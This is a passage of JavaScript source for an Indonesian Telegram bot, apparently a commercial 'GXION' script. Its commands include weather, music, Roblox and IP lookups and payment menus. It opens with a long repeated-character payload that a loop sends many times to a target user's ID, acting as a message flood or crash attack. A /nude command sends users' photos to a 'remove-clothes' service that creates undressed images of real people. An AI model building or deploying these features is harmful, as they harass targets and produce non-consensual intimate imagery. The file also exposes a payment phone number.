ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦽꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾBY LIXX";

  ctx.reply(`✅ Mengirim ${jumlah} pesan ke ID: ${targetId}`);

  for (let i = 0; i < jumlah; i++) {
    try {
      await ctx.telegram.sendMessage(targetId, pesan);
    } catch (err) {
      return ctx.reply("❌ Gagal mengirim! Pastikan ID valid dan bot sudah pernah di-start oleh target.");
    }
  }
});

bot.command("maps", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  
  if (!args) {
    return ctx.reply("📍 Gunakan format:\n/maps <nama lokasi>");
  }

  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(args)}`;
  
  await ctx.reply(`🗺 Lokasi ditemukan:\n${link}`);
});

// Contoh data statistik (bisa kamu isi/update di tempat lain)
const stat = {
  12345: 15,
  67890: 25,
  11223: 10,
  44556: 30,
  77889: 20,
};

bot.command('nude', async (ctx) => {
const args = ctx.message.text.split(' ').slice(1).join(' ');
  let imageUrl = args || null;

  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);
    imageUrl = fileLink.href;
  }

  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /nude (reply gambar)');
  }

  const statusMsg = await ctx.reply('⏳ ☇ Bahaya jir Wet proses Gambar😋');

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid');
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(hasil);
  } catch (e) {
    console.error(e); // Log error untuk debugging
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar');
  }
});

/**
 * HARD HTML encoder (support html+css+js)
 */
function encodeHtmlHard(input) {
  let s = (input === null || input === undefined) ? "" : String(input);

  // hardening
  s = s.replace(/\r\n?/g, "\n").replace(/\u0000/g, "");

  return s
    .replace(/&/g, "&amp;") // WAJIB pertama
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/**
 * Ambil argumen command (multiline support)
 */
function getCommandArg(ctx) {
  const text = ctx.message?.text ?? "";
  const m = text.match(/^\/\w+(?:@\w+)?(?:\s+([\s\S]*))?$/);
  return (m?.[1] ?? "").trim();
}

bot.command("enchtml", async (ctx) => {
  try {
    const raw = getCommandArg(ctx);

    if (!raw) {
      return ctx.reply(
        "❌ Input kosong\n\nContoh:\n/enchtml <html>...</html>"
      );
    }

    const encoded = encodeHtmlHard(raw);

    const htmlFile = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Encoded HTML + CSS + JS</title>
<style>
body {
  background: #0d1117;
  color: #e6edf3;
  font-family: monospace;
}
pre {
  white-space: pre-wrap;
  word-break: break-word;
  padding: 16px;
}
</style>
</head>
<body>
<h3>Encoded Source (Safe)</h3>
<pre>${encoded}</pre>
</body>
</html>`;

    const filePath = path.join(__dirname, "index.html");
    fs.writeFileSync(filePath, htmlFile, "utf8");

    await ctx.replyWithDocument({
      source: filePath,
      filename: "index.html"
    });

    fs.unlinkSync(filePath);

  } catch (e) {
    ctx.reply("❌ Error: " + (e?.message || String(e)));
  }
});

bot.command("cuaca", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  if (!input)
    return ctx.reply(
      "❌ Format salah.\n\nContoh:\n`/cuaca Jakarta`",
      { parse_mode: "Markdown" }
    );

  const url = `https://wttr.in/${encodeURIComponent(input)}?format=3`;

  try {
    const res = await fetch(url);
    const data = await res.text();
    ctx.reply(`🌤 Cuaca ${data}`);
  } catch (err) {
    ctx.reply("⚠ Tidak bisa mengambil data cuaca.");
  }
});

bot.command("info", async (ctx) => {
  try {
    const user = ctx.from;

    const id = user.id;
    const username = user.username ? `@${user.username}` : "❌ Tidak ada username";
    const isPremium = user.is_premium ? "✅ Ya (Premium)" : "❌ Tidak (Biasa)";
    const firstName = user.first_name || "Tanpa Nama";

    const teks = `
<b>📋 Informasi Pengguna</b>
├ Nama: <b>${firstName}</b>
├ Username: <b>${username}</b>
├ ID: <code>${id}</code>
└ Status Premium: <b>${isPremium}</b>
`;

    await ctx.replyWithHTML(teks);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat mengambil info pengguna.");
  }
});

bot.command("logo", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply(
      "❌ Format salah.\n\nContoh penggunaan:\n<code>/logo NamaKamu</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    // Gunakan layanan FlamingText (gratis, tanpa API key)
    const logoUrl = `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await ctx.replyWithMarkdown(`🖋️ *Logo kamu siap!*\nTeks: *${text}*`);
    await ctx.replyWithPhoto(logoUrl, { caption: "✨ Logo by FlamingText" });
  } catch (err) {
    console.error(err);
    await ctx.reply("⚠️ Terjadi kesalahan saat membuat logo. Coba lagi nanti.");
  }
});

// Command listharga
bot.command("listharga", async (ctx) => {
  const hargaList = `
━━━━━━━━━━━━━━━━━━━━━━━
<b>💎 LIST HARGA SCRIPT GXION 💎</b>
━━━━━━━━━━━━━━━━━━━━━━━
🚨15K NO UP
🗽30K FREE UP
💰35K RESELLER 
🪙40 PARTNER
👑50K OWNER
📡70K CEO
━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Pembayaran via:</b>
━━━━━━━━━━━━━━━━━━━━━━━
`;

  // Ganti URL QRIS & nomor DANA kamu
  const qrisUrl = "https://files.catbox.moe/fee7nh.jpg";
  const adminUrl = "https://t.me/Lixxisheree";
  const danaNumber = "082275284962"; // ← Ganti dengan nomor DANA kamu

  await ctx.replyWithHTML(
    hargaList,
    Markup.inlineKeyboard([
      [ Markup.button.url("💳 Bayar via QRIS", qrisUrl) ],
      [ Markup.button.callback("💰 Bayar via DANA", "bayar_dana") ],
      [ Markup.button.url("📞 Hubungi Admin", adminUrl) ]
    ])
  );
});

// Handler tombol DANA
bot.action("bayar_dana", async (ctx) => {
  await ctx.answerCbQuery(); 
  await ctx.replyWithHTML(
    `💰 <b>Nomor DANA Pembayaran:</b>\n<code>${"082275284962"}</code>\n\nSilakan kirim sesuai nominal yang tertera.`
  );
});

// 🔗 Link channel & owner
const LINK_TESTI = "https://t.me/Lixxtestimoni"; // channel kamu
const LINK_OWNER = "https://t.me/Lixxisheree2"; // link owner

// =============== CMD /uptesti ===============
bot.command("uptesti", async (ctx) => {
  try {
    const replyMsg = ctx.message.reply_to_message;
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();

    // 🔍 Cek apakah reply gambar & argumen lengkap
    if (!replyMsg || !replyMsg.photo || !args) {
      return ctx.reply(
        "Penggunaan yang benar ✅\nBalas foto dengan format:\n<code>/uptesti harga,payment,barang</code>",
        { parse_mode: "HTML" }
      );
    }

    const parts = args.split(",");
    if (parts.length < 3) {
      return ctx.reply(
        "⚠️ Format salah!\nContoh:\n<code>/uptesti 200k,dana,troli frog up</code>",
        { parse_mode: "HTML" }
      );
    }

    const [harga, payment, barang] = parts.map((x) => x.trim());

    const caption = `
✅ <b>𝙏𝙍𝘼𝙉𝙎𝘼𝙆𝙎𝙄 𝘽𝙀𝙍𝙃𝘼𝙎𝙄𝙇</b>
─────────────────
▧ <b>𝗡𝗼𝗺𝗶𝗻𝗮𝗹 :</b> ${harga}
▧ <b>𝗣𝗮𝘆𝗺𝗲𝗻𝘁 :</b> ${payment}
▧ <b>𝗕𝗮𝗿𝗮𝗻𝗴 :</b> ${barang}
─────────────────
#𝘼𝙇𝙇𝙏𝙍𝙓𝙉𝙊𝙍𝙀𝙁𝙁
#NEXT
`;

    // Ambil file_id foto yang direply
    const photo = replyMsg.photo[replyMsg.photo.length - 1].file_id;

    // 📨 Kirim ke channel kamu (public username)
    await ctx.telegram.sendPhoto("@Lixxtestimoni", photo, {
      caption,
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("💰 TESTIMONI LIXX", LINK_TESTI)],
        [Markup.button.url("👑 OWNER", LINK_OWNER)],
      ]),
    });

    await ctx.reply("✅ Testimoni berhasil di-upload ke saluran!");

  } catch (err) {
    console.error("❌ Error uptesti:", err);
    ctx.reply("❌ Terjadi kesalahan saat mengirim testimoni.\nPastikan bot sudah admin di @Lixxtestimoni.");
  }
});

bot.command("donasi", async (ctx) => {
  try {
    const username = ctx.from?.username
      ? `@${ctx.from.username}`
      : ctx.from?.first_name || "User";

    await ctx.replyWithChatAction("upload_photo");

    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/fee7nh.jpg" },
      {
        caption: `
<pre>
╭──────[ DONASI BOT ]──────
┃ ~Olaa ${username}
┃ 📸 Minta QR di Owner untuk berdonasi
┃ Donasimu bantu pengembangan bot ini 
╰────────────────────────────
</pre>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Saya Sudah Donasi", callback_data: "donasi_terima" }],
            [{ text: "👤 Kontak Developer", url: "https://t.me/Lixxisheree" }]
          ]
        }
      }
    );
  } catch (err) {
    console.error("❌ Gagal memproses perintah donasi:", err);
    await ctx.reply("⚠️ Terjadi kesalahan saat memproses perintah donasi.");
  }
});

bot.action("donasi_terima", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    // Hapus pesan donasi (gambar + caption + tombol)
    await ctx.deleteMessage(ctx.callbackQuery.message.message_id);

    const username = ctx.from?.username
      ? `@${ctx.from.username}`
      : ctx.from?.first_name || "User";

    // Animasi Progress Bar
    const steps = [
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[████░░░░░░] 40%",
      "[██████░░░░] 60%",
      "[████████░░] 80%",
      "[██████████] 100%"
    ];

    const progress = await ctx.reply("🎁 [░░░░░░░░░░] 0%");

    for (const step of steps) {
      await new Promise((res) => setTimeout(res, 300));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progress.message_id,
        null,
        `🎁 ${step}`
      );
    }

    // Hapus progress bar
    await ctx.telegram.deleteMessage(ctx.chat.id, progress.message_id);

    await ctx.replyWithChatAction("upload_photo");

    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/fee7nh.jpg" }, // Gambar ucapan terima kasih
      {
        caption: `
<pre>
╭──────[ TERIMA KASIH ]──────
┃ 📥 Makasih banyak udah support bot ini!
┃ 🙋‍♂️ ${username}
┃ Dukunganmu sangat berarti 🙏
╰─────────────────────────
</pre>`,
        parse_mode: "HTML"
      }
    );
  } catch (err) {
    console.error("❌ Gagal kirim ucapan terima kasih:", err);
    await ctx.reply("⚠️ Terjadi kesalahan saat mengirim ucapan terima kasih.");
  }
});

bot.command("trackip", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  const ip = args;

  if (!ip) {
    return ctx.reply("⚠️ Contoh:\n/trackip 8.8.8.8");
  }

  await ctx.reply("🛰 Sedang melacak IP...");

  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;

    await ctx.replyWithMarkdown(teks, {
      disable_web_page_preview: true,
    });
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error: " + err.message);
  }
});

const allowedFile = path.join(__dirname, 'allowedGroups.json');

function loadAllowedGroups() {
    if (!fs.existsSync(allowedFile)) {
        fs.writeFileSync(allowedFile, JSON.stringify([], null, 2));
    }
    return JSON.parse(fs.readFileSync(allowedFile));
}

function saveAllowedGroups(data) {
    fs.writeFileSync(allowedFile, JSON.stringify(data, null, 2));
}


bot.command("addgroup", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk pemilik bot.");

    const args = ctx.message.text.split(" ");

    if (!args[1]) {
        return ctx.reply("🪧 Format: /addgroup -1001234567890");
    }

    const groupId = parseInt(args[1]);

    if (isNaN(groupId) || !`${groupId}`.startsWith("-")) {
        return ctx.reply("⚠️ ID grup tidak valid! Gunakan format: -100xxxxxxxxxx");
    }

    const allowed = loadAllowedGroups();

    if (allowed.includes(groupId)) {
        return ctx.reply("⚠️ Grup sudah terdaftar.");
    }

    allowed.push(groupId);
    saveAllowedGroups(allowed);

    ctx.reply(`✅ Grup ${groupId} berhasil ditambahkan ke allowed group.`);
});


bot.command("delgroup", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk pemilik bot.");

    const args = ctx.message.text.split(" ");

    if (!args[1]) {
        return ctx.reply("🪧 Format: /delgroup -1001234567890");
    }

    const groupId = parseInt(args[1]);

    if (isNaN(groupId) || !`${groupId}`.startsWith("-")) {
        return ctx.reply("⚠️ ID grup tidak valid! Gunakan format: -100xxxxxxxxxx");
    }

    let allowed = loadAllowedGroups();

    if (!allowed.includes(groupId)) {
        return ctx.reply("⚠️ Grup tidak ditemukan di allowed group.");
    }

    allowed = allowed.filter(id => id !== groupId);
    saveAllowedGroups(allowed);

    ctx.reply(`🗑 Grup ${groupId} berhasil dihapus dari allowed group.`);
});

// Command: /button teks,link1,link2,...
bot.command('button', async (ctx) => {
  try {
    const replyMsg = ctx.message.reply_to_message;
    const input = ctx.message.text.split(' ').slice(1).join(' ').trim();

    if (!replyMsg) {
      return ctx.reply('⚠️ Balas pesan promosi yang ingin diberi tombol!\n\nContoh:\n/button link1,link2,nama_button');
    }

    if (!input) {
      return ctx.reply('⚠️ Contoh penggunaan:\n/button link1,link2,nama_button');
    }

    const parts = input.split(',');
    if (parts.length < 2) {
      return ctx.reply('⚠️ Format salah!\n\nContoh:\n/button https://t.me/link1,https://t.me/link2,Lixx');
    }

    const namaButton = parts[parts.length - 1];
    const urls = parts.slice(0, -1);
    const buttons = urls.map((url) => Markup.button.url(namaButton, url.trim()));

    // Ambil isi pesan promosi — bisa text atau caption
    const teksPromosi = replyMsg.text || replyMsg.caption || "(tanpa teks)";

    // Kirim ulang dengan format tebal & tanda kutip agar tampak premium
    await ctx.reply(
      `<blockquote><b>${teksPromosi}</b></blockquote>`,
      {
        ...Markup.inlineKeyboard([buttons]),
        parse_mode: "HTML",
        reply_to_message_id: replyMsg.message_id,
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply('❌ Terjadi kesalahan saat membuat tombol.');
  }
});

const playing = new Map()

// ================= UTIL =================
function parseSecs(s) {
  if (typeof s === "number") return s
  if (!s || typeof s !== "string") return 0
  return s.split(":").map(n => parseInt(n, 10)).reduce((a, v) => a * 60 + v, 0)
}

const topVideos = async (q) => {
  const r = await yts.search(q)
  const list = Array.isArray(r) ? r : (r.videos || [])
  return list
    .filter(v => {
      const sec = typeof v.seconds === "number"
        ? v.seconds
        : parseSecs(v.timestamp || v.duration?.timestamp || v.duration)
      return !v.live && sec > 0 && sec <= 1200
    })
    .slice(0, 5)
    .map(v => ({
      url: v.url,
      title: v.title
    }))
}

function normalizeYouTubeUrl(raw) {
  if (!raw || typeof raw !== "string") return ""
  let u = raw.trim()

  const shorts = u.match(/youtube\.com\/shorts\/([A-Za-z0-9_-]+)/i)
  if (shorts) return `https://www.youtube.com/watch?v=${shorts[1]}`

  const short2 = u.match(/youtu\.be\/([A-Za-z0-9_-]+)/i)
  if (short2) return `https://www.youtube.com/watch?v=${short2[1]}`

  const watch = u.match(/v=([A-Za-z0-9_-]+)/i)
  if (watch) return `https://www.youtube.com/watch?v=${watch[1]}`

  return u
}

const downloadToTemp = async (url) => {
  const file = path.join(os.tmpdir(), `gxion_${Date.now()}.mp3`)
  const res = await axios.get(url, { responseType: "stream" })

  await new Promise((resolve, reject) => {
    const w = fs.createWriteStream(file)
    res.data.pipe(w)
    w.on("finish", resolve)
    w.on("error", reject)
  })
  return file
}

function cleanup(f) {
  try { fs.unlinkSync(f) } catch {}
}

// ================= CORE PLAY =================
async function handlePlay(ctx, query) {
  if (!query) {
    return ctx.reply("🎧 Gunakan:\n/play judul\natau\nplay judul")
  }

  await ctx.reply("🎧 Mencari lagu...")
  await ctx.sendChatAction("typing")

  const isLink = /^https?:\/\/(www\.)?(youtube\.com|youtu\.be)/i.test(query)
  const candidates = isLink
    ? [{ url: query }]
    : await topVideos(query)

  if (!candidates.length) {
    return ctx.reply("❌ Lagu tidak ditemukan")
  }

  const ytUrl = normalizeYouTubeUrl(candidates[0].url)
  if (!ytUrl.includes("watch?v=")) {
    return ctx.reply("❌ URL YouTube tidak valid")
  }

  const apiUrl =
    "https://api.nekolabs.web.id/downloader/youtube/v1?" +
    new URLSearchParams({
      url: ytUrl,
      format: "mp3",
      quality: "128"
    })

  const r = await axios.get(apiUrl)
  const body = r.data

  if (!body?.success || !body?.result?.downloadUrl) {
    return ctx.reply("❌ Gagal download audio")
  }

  const file = await downloadToTemp(body.result.downloadUrl)

  try {
    await ctx.replyWithAudio(
      { source: file },
      {
        caption: `🎧 ${body.result.title}\nGXION`,
        title: body.result.title,
        performer: "gxion"
      }
    )

    playing.set(ctx.chat.id, {
      title: body.result.title,
      url: body.result.downloadUrl
    })
  } finally {
    cleanup(file)
  }
}

// ================= HANDLER YANG BENAR =================

// ✅ /play judul
bot.command("play", async (ctx) => {
  const q = ctx.message.text.split(" ").slice(1).join(" ").trim()
  return handlePlay(ctx, q)
})

// ✅ play judul (tanpa slash)
bot.hears(/^play\s+(.+)/i, async (ctx) => {
  const q = ctx.match[1].trim()
  return handlePlay(ctx, q)
})

bot.command("pinterest", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!text) {
    return ctx.reply(
      "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max"
    );
  }

  const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(text)}`;

  try {
    const res = await axios.get(apiUrl);
    const data = res.data;

    if (!data || !data.result || data.result.length === 0) {
      return ctx.reply("❌ No Pinterest images found for your query.");
    }

    const firstResult = data.result[0];
    await ctx.replyWithPhoto(
      { url: firstResult },
      {
        caption: `📌 Pinterest Result for: *${text}*`,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error("Pinterest API Error:", err);
    ctx.reply("❌ Error fetching Pinterest image. Please try again later.");
  }
});

// Helper HTTP
async function httpGet(url, headers = {}) {
  const { data } = await axios.get(url, { headers, timeout: 15000 });
  return data;
}

async function httpPost(url, body, headers = {}) {
  const { data } = await axios.post(url, body, { headers, timeout: 15000 });
  return data;
}

// Resolve username -> userId
async function resolveUserId(query) {
  // kalau angka: langsung userId
  if (/^\d+$/.test(query)) return { userId: Number(query), username: null };

  const res = await httpPost("https://users.roblox.com/v1/usernames/users", {
    usernames: [query],
    excludeBannedUsers: false,
  });

  const found = res?.data?.[0];
  if (!found?.id) return null;
  return { userId: found.id, username: found.name };
}

// Get user detail
async function getUserDetail(userId) {
  return await httpGet(`https://users.roblox.com/v1/users/${userId}`);
}

// Get avatar thumbnail
async function getAvatarThumb(userId) {
  const res = await httpGet(
    `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`
  );
  return res?.data?.[0]?.imageUrl || null;
}

// Get presence
async function getPresence(userId) {
  // userPresenceType biasanya:
  // 0=Offline, 1=Online, 2=InGame, 3=InStudio (kadang)
  const res = await httpPost("https://presence.roblox.com/v1/presence/users", {
    userIds: [userId],
  });

  return res?.userPresences?.[0] || null;
}

// /roblox command (pakai hears supaya bisa handle args lebih gampang)
bot.hears(/^\/roblox(?:\s+(.+))?$/i, async (ctx) => {
  try {
    const q = (ctx.match?.[1] || "").trim();

    if (!q) {
      return ctx.reply(
        "Format:\n/roblox <username|userId>\n\nContoh:\n/roblox Builderman\n/roblox 156"
      );
    }

    // 1) resolve
    const resolved = await resolveUserId(q);
    if (!resolved) return ctx.reply("User Roblox tidak ditemukan.");

    const { userId } = resolved;

    // 2) fetch detail + avatar + presence (presence optional)
    const user = await getUserDetail(userId);
    if (!user?.id) return ctx.reply("Gagal ambil data user Roblox.");

    let avatarUrl = null;
    try {
      avatarUrl = await getAvatarThumb(userId);
    } catch {}

    let presence = null;
    try {
      presence = await getPresence(userId);
    } catch {}

    // 3) format caption
    const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
    const created = user?.created ? new Date(user.created) : null;
    const createdStr = created ? created.toISOString().slice(0, 10) : "-";

    let presenceText = "Presence: tidak tersedia / disembunyikan.";
    let gameText = "";

    if (presence) {
      const typeMap = {
        0: "Offline",
        1: "Online",
        2: "Sedang main game",
        3: "Di Roblox Studio",
      };
      const type = typeMap[presence.userPresenceType] || "Unknown";

      presenceText = `Presence: ${type}`;
      if (presence.lastOnline) presenceText += `\nLast Online: ${presence.lastOnline}`;

      if (presence.userPresenceType === 2) {
        // kadang Roblox ngasih lastLocation (nama game/lokasi)
        if (presence.lastLocation) gameText += `\nLokasi: ${presence.lastLocation}`;
        if (presence.universeId) gameText += `\nUniverseId: ${presence.universeId}`;
        if (presence.placeId) gameText += `\nPlaceId: ${presence.placeId}`;
      }
    }

    const bio = (user.description && user.description.trim()) ? user.description.trim() : "-";

    const caption =
`👤 Roblox User
• Username: ${user.name}
• Display: ${user.displayName ?? "-"}
• UserId: ${user.id}
• Created: ${createdStr}

📝 Bio:
${bio}

${presenceText}${gameText}

🔗 Profile: ${profileUrl}`;

    // 4) send
    if (avatarUrl) {
      // Telegraf: kirim foto via URL
      return ctx.replyWithPhoto({ url: avatarUrl }, { caption });
    }
    return ctx.reply(caption);
  } catch (err) {
    console.error(err);
    return ctx.reply("Terjadi error saat cek Roblox. Coba lagi nanti.");
  }
});

// List URL cosplayer dari kamu
const cosplayerUrls = [
  "https://files.catbox.moe/qwvexg.jpg",
  "https://files.catbox.moe/tx084p.jpg",
  "https://files.catbox.moe/4jldsb.jpg",
  "https://files.catbox.moe/2roz4q.jpg",
  "https://files.catbox.moe/hjy0l3.jpg",
  "https://files.catbox.moe/i3v41l.jpg",
  "https://files.catbox.moe/7o235s.jpg",
  "https://files.catbox.moe/fewk1d.jpg",
  "https://files.catbox.moe/e34i9h.jpg",
  "https://files.catbox.moe/gasa9d.jpg",
  "https://files.catbox.moe/eqf2gg.jpg",
  "https://files.catbox.moe/2etqsj.jpg",
  "https://files.catbox.moe/6wghji.jpg",
  "https://files.catbox.moe/wu0a1a.jpg",
  "https://files.catbox.moe/kvpo0p.jpg",
  "https://files.catbox.moe/1mzagy.jpg",
  "https://files.catbox.moe/2vq9rb.jpg",
  "https://files.catbox.moe/ssdkxu.jpg",
  "https://files.catbox.moe/31dd8u.jpg",
  "https://files.catbox.moe/9304vg.jpg",
  "https://files.catbox.moe/avbpjm.jpg",
  "https://files.catbox.moe/61b9hq.jpg",
  "https://files.catbox.moe/iyc7b6.jpg",
  "https://files.catbox.moe/ob1rko.jpg",
  "https://files.catbox.moe/8diq6h.jpg",
  "https://files.catbox.moe/u7oorm.jpg",
  "https://files.catbox.moe/s1wqdn.jpg",
  "https://files.catbox.moe/vz5em3.jpg",
  "https://files.catbox.moe/km4chu.jpg",
  "https://files.catbox.moe/lybay6.jpg",
  "https://files.catbox.moe/jmb7ya.jpg",
  "https://files.catbox.moe/3b2ffa.jpg",
  "https://files.catbox.moe/d3y1xq.jpg",
  "https://files.catbox.moe/77l1m3.jpg",
  "https://files.catbox.moe/7t3jlj.jpg",
  "https://files.catbox.moe/xi2um2.jpg",
  "https://files.catbox.moe/41d6h3.jpg",
  "https://files.catbox.moe/i7s1f7.jpg",
  "https://files.catbox.moe/0jjs2y.jpg",
  "https://files.catbox.moe/fvpw5d.jpg",
  "https://files.catbox.moe/v0lvcz.jpg",
  "https://files.catbox.moe/awdbul.jpg",
];

// Helper ambil random
function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Command /cosplayer
bot.command("cosplayer", async (ctx) => {
  try {
    const url = pickRandom(cosplayerUrls);

    // kirim foto dari URL
    await ctx.replyWithPhoto(
      { url },
      { caption: "✨ Random Cosplayer ✨\nKetik /cosplayer lagi untuk foto lain." }
    );
  } catch (err) {
    console.error("Error /cosplayer:", err);
    await ctx.reply("Maaf, gagal kirim gambar. Coba lagi ya.");
  }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🛠️ ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithVideo(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
